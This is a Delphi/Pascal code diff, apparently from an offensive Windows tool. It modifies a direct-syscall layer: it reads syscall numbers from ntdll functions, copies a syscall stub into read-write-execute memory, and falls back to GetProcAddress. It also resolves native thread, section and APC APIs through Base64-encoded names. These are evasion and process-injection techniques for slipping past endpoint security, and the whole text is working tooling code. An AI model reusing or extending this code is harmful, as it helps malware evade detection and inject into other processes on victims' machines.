@@ -740,14 +740,20 @@ begin
 end;
 
 {$IFDEF syscall}
-function getsyscall(id:byte):pointer;
+function getsyscall(id:dword):pointer;
 var
 oldprotect:dword;
 begin
 result:=allocmem(length(SYSCAL_BUF)); //alloc pointer
 VirtualProtectEx (GetCurrentProcess ,result,sizeof(SYSCAL_BUF),PAGE_EXECUTE_READWRITE ,@oldprotect);
+copymemory(@SYSCAL_BUF[4],@id,4); //update syscall id
 copymemory(result,@SYSCAL_BUF[0],length(SYSCAL_BUF)); //copy generic syscall
-tsyscall(result^)[4]:=id; //update syscall id
+{
+outputdebugstring(pchar(
+ inttohex(SYSCAL_BUF[0],2)+inttohex(SYSCAL_BUF[1],2)+inttohex(SYSCAL_BUF[2],2)+inttohex(SYSCAL_BUF[3],2)
++inttohex(SYSCAL_BUF[4],2)+inttohex(SYSCAL_BUF[5],2)+inttohex(SYSCAL_BUF[6],2)+inttohex(SYSCAL_BUF[7],2)
++inttohex(SYSCAL_BUF[8],2)+inttohex(SYSCAL_BUF[9],2)+inttohex(SYSCAL_BUF[10],2)));
+}
 end;
 
 function GetProcAddress_Syscall(hModule:HINST; Base64lpProcName:string):FARPROC;
@@ -757,8 +763,10 @@ ssn:nativeuint=0;
 begin
 procname:=DecodeStringBase64(Base64lpProcName);
 ssn := RetrieveSyscall( GetProcAddress( hModule, pchar(procname) ) );
-outputdebugstring(pchar(procname+':'+procname+' SSN:'+inttohex(ssn,8)));
-result:=getsyscall(byte(ssn));
+outputdebugstring(pchar(procname+':'+' SSN:'+inttohex(ssn,8)));
+if ssn>0
+   then result:=getsyscall(dword(ssn))
+   else result:=GetProcAddress (hmodule,pchar(procname));
 end;
 
 function initapi_syscall:boolean;
@@ -833,6 +841,7 @@ end;
 function initAPI:boolean;
   var
   lib:hmodule=0;
+  buffer:array[0..10] of byte;
   begin
   //writeln('initapi');
   result:=false;
@@ -864,6 +873,13 @@ function initAPI:boolean;
   NtDuplicateObject:=GetProcAddress_Base64(lib,'TnREdXBsaWNhdGVPYmplY3Q=');
   NtQueueApcThread:=GetProcAddress_Base64(lib,'TnRRdWV1ZUFwY1RocmVhZA==');
   NtSuspendThread:=GetProcAddress_Base64(lib,'TnRTdXNwZW5kVGhyZWFk');
+  {
+  copymemory(@buffer[0],@NtSuspendThread,11);
+  outputdebugstring(pchar(
+   inttohex(buffer[0],2)+inttohex(buffer[1],2)+inttohex(buffer[2],2)+inttohex(buffer[3],2)
+  +inttohex(buffer[4],2)+inttohex(buffer[5],2)+inttohex(buffer[6],2)+inttohex(buffer[7],2)
+  +inttohex(buffer[8],2)+inttohex(buffer[9],2)+inttohex(buffer[10],2)));
+  }
   NtAlertResumeThread:=GetProcAddress_Base64(lib,'TnRBbGVydFJlc3VtZVRocmVhZA==');
   NtResumeThread:=GetProcAddress_Base64(lib,'TnRSZXN1bWVUaHJlYWQ=');
   NtCreateSection:=GetProcAddress_Base64(lib,'TnRDcmVhdGVTZWN0aW9u');
